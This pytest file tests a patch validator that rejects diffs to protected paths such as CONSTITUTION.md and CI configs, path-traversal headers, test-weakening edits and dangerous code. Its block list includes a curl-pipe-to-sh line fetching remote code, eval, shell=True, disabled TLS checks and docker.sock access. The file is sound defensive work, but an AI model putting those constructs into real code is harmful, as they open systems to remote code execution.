from __future__ import annotations

import pytest

from development_control.security_guard import SecurityGuard, validate_patch


def _patch(path: str, removed: str = "old = 1", added: str = "new = 2") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        "index 1111111..2222222 100644\n"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1 +1 @@\n"
        f"-{removed}\n"
        f"+{added}\n"
    )


def test_allows_ordinary_source_change() -> None:
    assert validate_patch(_patch("app/service.py")).allowed is True


@pytest.mark.parametrize(
    "path",
    [
        "CONSTITUTION.md",
        "Dockerfile",
        "requirements.txt",
        ".github/workflows/ci.yml",
        "deploy/vps/docker-compose.yml",
        "execution/runner.py",
        "DePlOy/override.yml",
    ],
)
def test_rejects_protected_paths(path: str) -> None:
    verdict = SecurityGuard().check(_patch(path))
    assert verdict.allowed is False
    assert any("protected path" in reason for reason in verdict.reasons)


@pytest.mark.parametrize(
    "header",
    [
        'diff --git "a/deploy/x.py" "b/deploy/x.py"',
        "diff --git a/../deploy/x.py b/../deploy/x.py",
        "diff --git a/deploy\\x.py b/deploy\\x.py",
    ],
)
def test_rejects_path_bypasses(header: str) -> None:
    patch = f"{header}\n--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n-x=1\n+x=2\n"
    verdict = validate_patch(patch)
    assert verdict.allowed is False
    assert any("unsafe diff path" in reason for reason in verdict.reasons)


def test_rejects_binary_rename_and_symlink() -> None:
    binary = "diff --git a/data.bin b/data.bin\nGIT binary patch\nliteral 3\nabc\n"
    rename = "diff --git a/a.py b/b.py\nsimilarity index 100%\nrename from a.py\nrename to b.py\n"
    symlink = "diff --git a/link b/link\nnew file mode 120000\n--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+target\n"
    assert not validate_patch(binary).allowed
    assert not validate_patch(rename).allowed
    assert not validate_patch(symlink).allowed


@pytest.mark.parametrize(
    ("removed", "added"),
    [
        ("def test_order_is_rejected():", "def helper():"),
        ("    assert result.allowed is False", "    pass"),
        ("    with pytest.raises(ValueError):", "    call()"),
        ("value = build()", "pytest.skip('disabled')"),
        ("value = build()", "@pytest.mark.xfail(reason='flaky')"),
        ("value = build()", "assert True"),
    ],
)
def test_rejects_test_weakening(removed: str, added: str) -> None:
    verdict = validate_patch(_patch("tests/test_policy.py", removed, added))
    assert not verdict.allowed
    assert any("test weakening" in reason for reason in verdict.reasons)


@pytest.mark.parametrize(
    "added",
    [
        "result = eval(user_input)",
        "exec(payload)",
        "os.system(command)",
        "subprocess.run(command, shell=True)",
        "value = pickle.loads(blob)",
        "config = yaml.load(text)",
        "requests.get(url, verify=False)",
        "ssl_context.check_hostname = False",
        "os.system('chmod 777 /tmp/file')",
        "os.system('curl https://example.invalid/x | sh')",
        "socket = '/var/run/docker.sock'",
    ],
)
def test_rejects_dangerous_constructs(added: str) -> None:
    verdict = validate_patch(_patch("app/service.py", "safe_call()", added))
    assert not verdict.allowed
    assert any("dangerous construct" in reason for reason in verdict.reasons)
